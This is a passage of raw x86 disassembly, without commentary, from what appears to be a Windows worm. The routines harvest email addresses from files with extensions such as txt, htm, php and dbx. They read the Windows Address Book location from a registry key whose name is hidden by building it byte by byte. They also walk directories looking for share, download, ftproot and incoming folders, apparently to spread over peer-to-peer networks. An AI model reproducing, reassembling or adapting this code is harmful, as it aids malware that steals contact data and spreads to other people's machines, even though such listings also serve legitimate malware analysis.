		mov	[ebp+var_4], ebx

loc_80470A:				; CODE XREF: sub_8046C9+B6j
		cmp	ebx, esi
		jg	short loc_804774
		mov	ecx, [ebp+arg_0]
		mov	eax, esi
		sub	eax, ebx
		push	ebx
		mov	[ebp+var_C], eax
		add	eax, ecx
		push	eax
		push	dword ptr [edi-4]
		call	sub_802F26
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_804774
		push	dword ptr [edi]
		mov	esi, [ebp+var_C]
		mov	eax, [ebp+arg_0]
		inc	[ebp+var_8]
		push	dword ptr [edi+4]
		add	eax, esi
		push	eax
		call	memcpy
		mov	eax, [edi]
		add	esp, 0Ch
		cmp	ebx, eax
		jz	short loc_80476D
		mov	edx, [ebp+arg_4]
		add	eax, esi
		sub	edx, [ebp+var_4]
		add	eax, [ebp+arg_0]
		lea	ecx, [ebx+esi]
		add	ecx, [ebp+arg_0]
		sub	edx, esi
		test	edx, edx
		jle	short loc_80476A

loc_804761:				; CODE XREF: sub_8046C9+9Fj
		mov	bl, [ecx]
		mov	[eax], bl
		inc	eax
		inc	ecx
		dec	edx
		jnz	short loc_804761

loc_80476A:				; CODE XREF: sub_8046C9+96j
		mov	ebx, [ebp+var_4]

loc_80476D:				; CODE XREF: sub_8046C9+7Fj
		mov	eax, [edi]
		sub	eax, ebx
		add	[ebp+arg_4], eax

loc_804774:				; CODE XREF: sub_8046C9+43j
					; sub_8046C9+60j
		mov	ebx, [edi+8]
		add	edi, 10h
		test	ebx, ebx
		mov	[ebp+var_4], ebx
		jnz	short loc_80470A
		inc	esi
		cmp	esi, [ebp+arg_4]
		jle	loc_8046FF

loc_80478B:				; CODE XREF: sub_8046C9+30j
		mov	eax, [ebp+arg_0]
		mov	ecx, [ebp+arg_4]
		push	eax
		and	byte ptr [eax+ecx], 0
		call	sub_802FA0
		add	eax, [ebp+var_8]
		pop	ecx
		jnz	loc_8046F1
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		leave
		retn
sub_8046C9	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8047AC	proc near		; CODE XREF: sub_8048A0+88p

var_108		= dword	ptr -108h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		push	edi
		xor	edi, edi
		cmp	[ebp+arg_4], edi
		mov	[ebp+var_4], edi
		jle	loc_80489A
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]

loc_8047C9:				; CODE XREF: sub_8047AC+E6j
		lea	ebx, [edi+1]
		mov	[ebp+var_8], ebx
		cmp	byte ptr [esi+ebx-1], 40h
		jnz	loc_80488D
		test	edi, edi
		mov	ecx, edi
		jle	short loc_8047F3

loc_8047E0:				; CODE XREF: sub_8047AC+45j
		movzx	eax, byte ptr [esi+ecx-1]
		cmp	ds:byte_801908[eax], 0
		jz	short loc_8047F3
		dec	ecx
		test	ecx, ecx
		jg	short loc_8047E0

loc_8047F3:				; CODE XREF: sub_8047AC+32j
					; sub_8047AC+40j
		cmp	ebx, [ebp+arg_4]
		mov	eax, ebx
		jge	short loc_80481D

loc_8047FA:				; CODE XREF: sub_8047AC+5Fj
		movzx	edx, byte ptr [eax+esi]
		cmp	ds:byte_801908[edx], 0
		jz	short loc_80481D
		inc	eax
		cmp	eax, [ebp+arg_4]
		jl	short loc_8047FA
		jmp	short loc_80481D
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_80480F:				; CODE XREF: sub_8047AC+73j
		movzx	edx, byte ptr [ecx+esi]
		cmp	ds:byte_801908[edx], 2
		jnz	short loc_804821
		inc	ecx

loc_80481D:				; CODE XREF: sub_8047AC+4Cj
					; sub_8047AC+59j ...
		cmp	ecx, eax
		jl	short loc_80480F

loc_804821:				; CODE XREF: sub_8047AC+6Ej
		lea	edx, [ecx+3]
		cmp	edx, eax
		jge	short loc_80488D
		cmp	ecx, edi
		jge	short loc_80488D
		cmp	eax, ecx
		jle	short loc_804846

loc_804830:				; CODE XREF: sub_8047AC+95j
		movzx	ebx, byte ptr [esi+eax-1]
		cmp	ds:byte_801908[ebx], 2
		jnz	short loc_804843
		dec	eax
		cmp	eax, ecx
		jg	short loc_804830

loc_804843:				; CODE XREF: sub_8047AC+90j
		mov	ebx, [ebp+var_8]

loc_804846:				; CODE XREF: sub_8047AC+82j
		cmp	eax, edx
		jle	short loc_80488D
		cmp	eax, edi
		jle	short loc_80488D
		sub	eax, ecx
		mov	edi, eax
		cmp	edi, 7
		jl	short loc_80488D
		inc	[ebp+var_4]
		xor	edx, edx
		add	ecx, esi

loc_80485E:				; CODE XREF: sub_8047AC+C7j
		cmp	edx, edi
		jge	short loc_804875
		mov	al, [ecx]
		mov	byte ptr [ebp+edx+var_108], al
		inc	edx
		inc	ecx
		cmp	edx, 0FEh
		jb	short loc_80485E

loc_804875:				; CODE XREF: sub_8047AC+B4j
		and	byte ptr [ebp+edx+var_108], 0
		lea	eax, [ebp+var_108]
		push	0
		push	eax
		call	sub_80418A
		pop	ecx
		pop	ecx

loc_80488D:				; CODE XREF: sub_8047AC+28j
					; sub_8047AC+7Aj ...
		mov	edi, ebx
		cmp	edi, [ebp+arg_4]
		jl	loc_8047C9
		pop	esi
		pop	ebx

loc_80489A:				; CODE XREF: sub_8047AC+12j
		mov	eax, [ebp+var_4]
		pop	edi
		leave
		retn
sub_8047AC	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_8048A0	proc near		; CODE XREF: sub_804BB6+163p
					; sub_805158+1Ep

var_10010	= dword	ptr -10010h
hObject		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
lpFileName	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, 10010h
		call	sub_807EE0
		push	ebx
		xor	ebx, ebx
		push	ebx		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	ebx		; lpSecurityAttributes
		push	3		; dwShareMode
		push	80000000h	; dwDesiredAccess
		push	[ebp+lpFileName] ; lpFileName
		call	ds:CreateFileA
		cmp	eax, ebx
		mov	[ebp+hObject], eax
		jz	loc_804969
		cmp	eax, 0FFFFFFFFh
		jz	loc_804969
		push	esi
		mov	esi, ds:ReadFile
		push	edi
		lea	ecx, [ebp+var_4]
		push	ebx
		push	ecx
		mov	edi, 0FFFDh
		lea	ecx, [ebp+var_10010]
		push	edi
		push	ecx
		mov	[ebp+var_8], ebx
		mov	[ebp+var_C], ebx
		push	eax
		jmp	short loc_80494E
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804900:				; CODE XREF: sub_8048A0+B8j
		cmp	eax, 0FFFFh
		jnb	short loc_80495A
		add	[ebp+var_8], eax
		mov	byte ptr [ebp+eax+var_10010], bl
		push	eax
		lea	eax, [ebp+var_10010]
		push	eax
		call	sub_8046C9
		push	[ebp+var_4]
		lea	eax, [ebp+var_10010]
		push	eax
		call	sub_8047AC
		add	esp, 10h
		add	[ebp+var_C], eax
		jnz	short loc_80493E
		cmp	[ebp+var_8], 4B000h
		ja	short loc_80495A

loc_80493E:				; CODE XREF: sub_8048A0+93j
		lea	eax, [ebp+var_4]
		push	ebx
		push	eax
		lea	eax, [ebp+var_10010]
		push	edi
		push	eax
		push	[ebp+hObject]

loc_80494E:				; CODE XREF: sub_8048A0+5Ej
		mov	[ebp+var_4], ebx
		call	esi
		mov	eax, [ebp+var_4]
		cmp	eax, ebx
		jnz	short loc_804900

loc_80495A:				; CODE XREF: sub_8048A0+65j
					; sub_8048A0+9Cj
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle
		pop	edi
		xor	eax, eax
		pop	esi
		jmp	short loc_80496C
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804969:				; CODE XREF: sub_8048A0+2Ej
					; sub_8048A0+37j
		xor	eax, eax
		inc	eax

loc_80496C:				; CODE XREF: sub_8048A0+C7j
		pop	ebx
		leave
		retn
sub_8048A0	endp


;  S U B	R O U T	I N E 


sub_80496F	proc near		; CODE XREF: sub_804A7D+11Bp
					; sub_804BB6+172p

var_74		= dword	ptr -74h

		push	ebp
		lea	ebp, [esp+var_74]
		sub	esp, 94h
		push	ebx
		xor	ebx, ebx
		push	esi
		push	ebx		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	ebx		; lpSecurityAttributes
		push	3		; dwShareMode
		push	80000000h	; dwDesiredAccess
		push	dword ptr [ebp+7Ch] ; lpFileName
		call	ds:CreateFileA
		mov	esi, eax
		cmp	esi, ebx
		mov	[ebp+64h], esi
		jz	loc_804A73
		cmp	esi, 0FFFFFFFFh
		jz	loc_804A73
		push	ebx		; lpFileSizeHigh
		push	esi		; hFile
		call	ds:GetFileSize
		push	ebx		; lpName
		push	ebx		; dwMaximumSizeLow
		push	ebx		; dwMaximumSizeHigh
		push	2		; flProtect
		push	ebx		; lpFileMappingAttributes
		push	esi		; hFile
		mov	[ebp+68h], eax
		call	ds:CreateFileMappingA
		cmp	eax, ebx
		mov	[ebp+60h], eax
		jz	loc_804A6E
		cmp	eax, 0FFFFFFFFh
		jz	loc_804A6E
		push	edi
		push	ebx		; dwNumberOfBytesToMap
		push	ebx		; dwFileOffsetLow
		push	ebx		; dwFileOffsetHigh
		push	4		; dwDesiredAccess
		push	eax		; hFileMappingObject
		call	ds:MapViewOfFile
		mov	edi, eax
		cmp	edi, ebx
		jnz	short loc_8049F1
		push	3
		pop	ebx
		jmp	short loc_804A57
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_8049F1:				; CODE XREF: sub_80496F+7Bj
		mov	eax, [edi+64h]
		mov	ecx, [edi+60h]
		cmp	eax, ebx
		jbe	short loc_804A50
		mov	[ebp+70h], ecx
		mov	[ebp+6Ch], eax

loc_804A01:				; CODE XREF: sub_80496F+DFj
		mov	esi, [ebp+70h]
		push	80h
		lea	eax, [ebp-20h]
		push	ebx
		push	eax
		call	memset
		mov	ecx, [ebp+68h]
		add	esp, 0Ch
		xor	eax, eax
		cmp	esi, ecx
		jnb	short loc_804A47

loc_804A1F:				; CODE XREF: sub_80496F+C6j
		cmp	eax, 44h
		jnb	short loc_804A37
		mov	dl, [esi+edi]
		mov	[ebp+eax-20h], dl
		cmp	[esi+edi], bl
		jz	short loc_804A37
		inc	eax
		inc	esi
		inc	esi
		cmp	esi, ecx
		jb	short loc_804A1F

loc_804A37:				; CODE XREF: sub_80496F+B3j
					; sub_80496F+BFj
		cmp	eax, ebx
		jbe	short loc_804A47
		lea	eax, [ebp-20h]
		push	ebx
		push	eax
		call	sub_80418A
		pop	ecx
		pop	ecx

loc_804A47:				; CODE XREF: sub_80496F+AEj
					; sub_80496F+CAj
		add	dword ptr [ebp+70h], 44h
		dec	dword ptr [ebp+6Ch]
		jnz	short loc_804A01

loc_804A50:				; CODE XREF: sub_80496F+8Aj
		push	edi		; lpBaseAddress
		call	ds:UnmapViewOfFile

loc_804A57:				; CODE XREF: sub_80496F+80j
		push	dword ptr [ebp+60h] ; hObject
		call	ds:CloseHandle
		pop	edi

loc_804A61:				; CODE XREF: sub_80496F+102j
		push	dword ptr [ebp+64h] ; hObject
		call	ds:CloseHandle
		mov	eax, ebx
		jmp	short loc_804A76
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804A6E:				; CODE XREF: sub_80496F+5Bj
					; sub_80496F+64j
		push	2
		pop	ebx
		jmp	short loc_804A61
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804A73:				; CODE XREF: sub_80496F+2Fj
					; sub_80496F+38j
		xor	eax, eax
		inc	eax

loc_804A76:				; CODE XREF: sub_80496F+FDj
		pop	esi
		pop	ebx
		add	ebp, 74h
		leave
		retn
sub_80496F	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_804A7D	proc near		; CODE XREF: sub_805158+46p

Data		= byte ptr -134h
cbData		= dword	ptr -34h
hKey		= dword	ptr -30h
SubKey		= byte ptr -2Ch
var_28		= byte ptr -28h
var_27		= byte ptr -27h
var_26		= byte ptr -26h
var_25		= byte ptr -25h
var_24		= byte ptr -24h
var_23		= byte ptr -23h
var_22		= byte ptr -22h
var_21		= byte ptr -21h
var_20		= byte ptr -20h
var_1F		= byte ptr -1Fh
var_1E		= byte ptr -1Eh
var_1D		= byte ptr -1Dh
var_1C		= byte ptr -1Ch
var_1B		= byte ptr -1Bh
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_18		= byte ptr -18h
var_17		= byte ptr -17h
var_16		= byte ptr -16h
var_15		= byte ptr -15h
var_14		= byte ptr -14h
var_13		= byte ptr -13h
var_12		= byte ptr -12h
var_11		= byte ptr -11h
var_10		= byte ptr -10h
var_F		= byte ptr -0Fh
var_E		= byte ptr -0Eh
var_D		= byte ptr -0Dh
var_C		= byte ptr -0Ch
var_B		= byte ptr -0Bh
var_A		= byte ptr -0Ah
var_9		= byte ptr -9
var_8		= byte ptr -8
var_7		= byte ptr -7
var_6		= byte ptr -6
var_5		= byte ptr -5
var_4		= byte ptr -4
var_3		= byte ptr -3

		push	ebp
		mov	ebp, esp
		sub	esp, 134h
		lea	eax, [ebp+hKey]
		push	ebx
		xor	ebx, ebx
		push	eax		; phkResult
		push	20019h		; samDesired
		lea	eax, [ebp+SubKey]
		push	ebx		; ulOptions
		push	eax		; lpSubKey
		push	80000001h	; hKey
		mov	[ebp+SubKey], 53h
		mov	byte ptr [ebp-2Bh], 6Fh
		mov	byte ptr [ebp-2Ah], 66h
		mov	byte ptr [ebp-29h], 74h
		mov	[ebp+var_28], 77h
		mov	[ebp+var_27], 61h
		mov	[ebp+var_26], 72h
		mov	[ebp+var_25], 65h
		mov	[ebp+var_24], 5Ch
		mov	[ebp+var_23], 4Dh
		mov	[ebp+var_22], 69h
		mov	[ebp+var_21], 63h
		mov	[ebp+var_20], 72h
		mov	[ebp+var_1F], 6Fh
		mov	[ebp+var_1E], 73h
		mov	[ebp+var_1D], 6Fh
		mov	[ebp+var_1C], 66h
		mov	[ebp+var_1B], 74h
		mov	[ebp+var_1A], 5Ch
		mov	[ebp+var_19], 57h
		mov	[ebp+var_18], 41h
		mov	[ebp+var_17], 42h
		mov	[ebp+var_16], 5Ch
		mov	[ebp+var_15], 57h
		mov	[ebp+var_14], 41h
		mov	[ebp+var_13], 42h
		mov	[ebp+var_12], 34h
		mov	[ebp+var_11], 5Ch
		mov	[ebp+var_10], 57h
		mov	[ebp+var_F], 61h
		mov	[ebp+var_E], 62h
		mov	[ebp+var_D], 20h
		mov	[ebp+var_C], 46h
		mov	[ebp+var_B], 69h
		mov	[ebp+var_A], 6Ch
		mov	[ebp+var_9], 65h
		mov	[ebp+var_8], 20h
		mov	[ebp+var_7], 4Eh
		mov	[ebp+var_6], 61h
		mov	[ebp+var_5], 6Dh
		mov	[ebp+var_4], 65h
		mov	[ebp+var_3], bl
		call	ds:RegOpenKeyExA
		test	eax, eax
		jnz	short loc_804B9E
		push	100h
		lea	eax, [ebp+Data]
		push	ebx
		push	eax
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+cbData]
		mov	[ebp+cbData], 100h
		push	eax		; lpcbData
		lea	eax, [ebp+Data]
		push	eax		; lpData
		push	ebx		; lpType
		push	ebx		; lpReserved
		push	ebx		; lpValueName
		push	[ebp+hKey]	; hKey
		call	ds:RegQueryValueExA
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey
		cmp	[ebp+Data], bl
		jz	short loc_804B9E
		lea	eax, [ebp+Data]
		push	eax
		call	sub_80496F
		pop	ecx

loc_804B9E:				; CODE XREF: sub_804A7D+CEj
					; sub_804A7D+112j
		pop	ebx
		leave
		retn
sub_804A7D	endp


;  S U B	R O U T	I N E 


sub_804BA1	proc near		; CODE XREF: sub_802CB2+9Ep
		mov	ds:dword_808248, 0
		retn
sub_804BA1	endp


;  S U B	R O U T	I N E 


sub_804BAC	proc near		; CODE XREF: sub_804578+12p
					; sub_804578+3Cp ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	ds:dword_808248, eax
		retn
sub_804BAC	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_804BB6	proc near		; CODE XREF: sub_804D32+1F5p

sz		= byte ptr -10h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		cmp	dword ptr [esi+20h], 28h
		jb	locret_804D30
		xor	eax, eax
		or	ecx, 0FFFFFFFFh
		cmp	[esi+2Ch], al
		jz	short loc_804BEC

loc_804BD0:				; CODE XREF: sub_804BB6+30j
		cmp	eax, 0FFh
		jge	short loc_804BE8
		cmp	byte ptr [esi+eax+2Ch],	2Eh
		jnz	short loc_804BE0
		mov	ecx, eax

loc_804BE0:				; CODE XREF: sub_804BB6+26j
		inc	eax
		cmp	byte ptr [esi+eax+2Ch],	0
		jnz	short loc_804BD0

loc_804BE8:				; CODE XREF: sub_804BB6+1Fj
		test	ecx, ecx
		jge	short loc_804BF3

loc_804BEC:				; CODE XREF: sub_804BB6+18j
		xor	al, al
		mov	[ebp+sz], al
		jmp	short loc_804C11
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804BF3:				; CODE XREF: sub_804BB6+34j
		lea	eax, [ecx+esi+2Dh]
		push	0Fh		; iMaxLength
		push	eax		; lpString2
		lea	eax, [ebp+sz]
		push	eax		; lpString1
		call	ds:lstrcpynA
		lea	eax, [ebp+sz]
		push	eax		; lpsz
		call	ds:CharLowerA
		mov	al, [ebp+sz]

loc_804C11:				; CODE XREF: sub_804BB6+3Bj
		push	ebx
		push	edi
		xor	edi, edi
		mov	ecx, 50000h
		inc	edi
		test	al, al
		jnz	short loc_804C29
		mov	ecx, 5000h
		jmp	loc_804CE4
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804C29:				; CODE XREF: sub_804BB6+67j
		mov	dl, [ebp-0Fh]
		cmp	al, 70h
		jnz	short loc_804C42
		cmp	dl, 6Ch
		jz	loc_804CE4
		cmp	dl, 68h
		jz	loc_804CE4

loc_804C42:				; CODE XREF: sub_804BB6+78j
		mov	bl, [ebp-0Eh]
		cmp	al, 74h
		jnz	short loc_804C63
		cmp	dl, 78h
		jnz	short loc_804C58
		mov	ecx, 14800h
		jmp	loc_804CE4
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804C58:				; CODE XREF: sub_804BB6+96j
		cmp	dl, 62h
		jnz	short loc_804CA4
		cmp	bl, dl
		jnz	short loc_804CA4
		jmp	short loc_804CB5
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804C63:				; CODE XREF: sub_804BB6+91j
		cmp	al, 68h
		jnz	short loc_804C6C
		cmp	dl, 74h
		jz	short loc_804CE4

loc_804C6C:				; CODE XREF: sub_804BB6+AFj
		cmp	al, 61h
		jnz	short loc_804C7A
		cmp	dl, 73h
		jnz	short loc_804C8C
		cmp	bl, 70h
		jz	short loc_804CE4

loc_804C7A:				; CODE XREF: sub_804BB6+B8j
		cmp	al, 73h
		jnz	short loc_804C88
		cmp	dl, 68h
		jnz	short loc_804CA4
		cmp	bl, 74h
		jz	short loc_804CE4

loc_804C88:				; CODE XREF: sub_804BB6+C6j
		cmp	al, 61h
		jnz	short loc_804C96

loc_804C8C:				; CODE XREF: sub_804BB6+BDj
		cmp	dl, 64h
		jnz	short loc_804CA4
		cmp	bl, 62h
		jz	short loc_804CE4

loc_804C96:				; CODE XREF: sub_804BB6+D4j
		cmp	al, 64h
		jnz	short loc_804CA4
		cmp	dl, 62h
		jnz	short loc_804CA4
		cmp	bl, 78h
		jz	short loc_804CE4

loc_804CA4:				; CODE XREF: sub_804BB6+A5j
					; sub_804BB6+A9j ...
		push	2
		cmp	al, 77h
		pop	edi
		jnz	short loc_804CBC
		cmp	dl, 61h
		jnz	short loc_804CBC
		cmp	bl, 62h
		jnz	short loc_804CBC

loc_804CB5:				; CODE XREF: sub_804BB6+ABj
		mov	ecx, 2000000h
		jmp	short loc_804CE4
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804CBC:				; CODE XREF: sub_804BB6+F3j
					; sub_804BB6+F8j ...
		cmp	ds:dword_808138, 0
		jle	short loc_804D2E
		call	sub_802E9C
		movzx	eax, ax
		push	64h
		cdq
		pop	ecx
		idiv	ecx
		cmp	edx, 19h
		jge	short loc_804D2E
		mov	ecx, ds:dword_808138
		xor	edi, edi
		inc	edi
		shl	ecx, 14h

loc_804CE4:				; CODE XREF: sub_804BB6+6Ej
					; sub_804BB6+7Dj ...
		mov	eax, ds:dword_808138
		test	eax, eax
		jle	short loc_804CF6
		shl	eax, 14h
		cmp	ecx, eax
		jnb	short loc_804CF6
		mov	ecx, eax

loc_804CF6:				; CODE XREF: sub_804BB6+135j
					; sub_804BB6+13Cj
		cmp	[esi+20h], ecx
		ja	short loc_804D2E
		jmp	short loc_804D08
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804CFD:				; CODE XREF: sub_804BB6+159j
		push	800h		; dwMilliseconds
		call	ds:Sleep

loc_804D08:				; CODE XREF: sub_804BB6+145j
		cmp	ds:dword_808248, 0
		jnz	short loc_804CFD
		cmp	edi, 1
		jnz	short loc_804D20
		push	[ebp+arg_0]
		call	sub_8048A0
		jmp	short loc_804D2D
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804D20:				; CODE XREF: sub_804BB6+15Ej
		cmp	edi, 2
		jnz	short loc_804D2E
		push	[ebp+arg_0]
		call	sub_80496F

loc_804D2D:				; CODE XREF: sub_804BB6+168j
		pop	ecx

loc_804D2E:				; CODE XREF: sub_804BB6+10Dj
					; sub_804BB6+120j ...
		pop	edi
		pop	ebx

locret_804D30:				; CODE XREF: sub_804BB6+Aj
		leave
		retn
sub_804BB6	endp


;  S U B	R O U T	I N E 

; Attributes: bp-based frame

sub_804D32	proc near		; CODE XREF: sub_804D32+1DCp
					; sub_804F46+152p ...

String2		= byte ptr -25Ch
String1		= byte ptr -11Ch
hFindFile	= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 25Ch
		push	esi
		push	edi
		xor	edi, edi
		cmp	[ebp+arg_4], edi
		jle	short loc_804D50
		mov	esi, [ebp+arg_0]
		cmp	esi, edi
		jz	short loc_804D50
		cmp	byte ptr [esi],	0
		jnz	short loc_804D62

loc_804D50:				; CODE XREF: sub_804D32+10j
					; sub_804D32+17j
		xor	eax, eax
		inc	eax

loc_804D53:				; CODE XREF: sub_804D32+20Fj
		pop	edi
		pop	esi
		leave
		retn
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804D57:				; CODE XREF: sub_804D32+36j
		push	800h		; dwMilliseconds
		call	ds:Sleep

loc_804D62:				; CODE XREF: sub_804D32+1Cj
		cmp	ds:dword_808248, edi
		jnz	short loc_804D57
		push	ebx
		mov	ebx, ds:lstrcpyA
		lea	eax, [ebp+String1]
		push	esi		; lpString2
		push	eax		; lpString1
		call	ebx ; lstrcpyA
		lea	eax, [ebp+String1]
		push	eax		; lpsz
		call	ds:CharLowerA
		mov	edi, ds:strstr
		lea	eax, [ebp+String1]
		push	offset aShar	; char *
		push	eax		; char *
		call	edi ; strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_804DDE
		lea	eax, [ebp+String1]
		push	offset aDownload ; char	*
		push	eax		; char *
		call	edi ; strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_804DDE
		lea	eax, [ebp+String1]
		push	offset aFtproot	; char *
		push	eax		; char *
		call	edi ; strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_804DDE
		lea	eax, [ebp+String1]
		push	offset aIncoming ; char	*
		push	eax		; char *
		call	edi ; strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_804DE5

loc_804DDE:				; CODE XREF: sub_804D32+6Ej
					; sub_804D32+82j ...
		push	esi
		call	sub_803352
		pop	ecx

loc_804DE5:				; CODE XREF: sub_804D32+AAj
		lea	eax, [ebp+String1]
		push	esi		; lpString2
		push	eax		; lpString1
		call	ebx ; lstrcpyA
		lea	eax, [ebp+String1]
		lea	edi, [ebp+String1]
		push	eax		; lpString
		dec	edi
		call	ds:lstrlenA
		cmp	byte ptr [eax+edi], 5Ch
		jz	short loc_804E1B
		lea	eax, [ebp+String1]
		push	offset String2	; lpString2
		push	eax		; lpString1
		call	ds:lstrcatA

loc_804E1B:				; CODE XREF: sub_804D32+D5j
		lea	eax, [ebp+String1]
		push	offset a__1	; lpString2
		push	eax		; lpString1
		call	ds:lstrcatA
		push	140h
		lea	eax, [ebp+String2]
		push	0
		push	eax
		call	memset
		add	esp, 0Ch
		and	[ebp+hFindFile], 0

loc_804E47:				; CODE XREF: sub_804D32+168j
					; sub_804D32+17Aj ...
		cmp	[ebp+hFindFile], 0
		lea	eax, [ebp+String2]
		push	eax		; lpFindFileData
		jnz	short loc_804E79
		lea	eax, [ebp+String1]
		push	eax		; lpFileName
		call	ds:FindFirstFileA
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hFindFile], eax
		jnz	short loc_804E6D
		and	[ebp+hFindFile], 0

loc_804E6D:				; CODE XREF: sub_804D32+135j
		cmp	[ebp+hFindFile], 0
		jz	loc_804F3E
		jmp	short loc_804E8A ; lpFindFileData
; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

loc_804E79:				; CODE XREF: sub_804D32+120j
		push	[ebp+hFindFile]	; hFindFile
		call	ds:FindNextFileA
		test	eax, eax
		jz	loc_804F35

loc_804E8A:				; CODE XREF: sub_804D32+145j
		cmp	byte ptr [ebp-230h], 2Eh
		jnz	short loc_804EAE
		cmp	byte ptr [ebp-22Fh], 0
		jz	short loc_804E47
		cmp	byte ptr [ebp-22Fh], 2Eh
		jnz	short loc_804EAE
		cmp	byte ptr [ebp-22Eh], 0
		jz	short loc_804E47

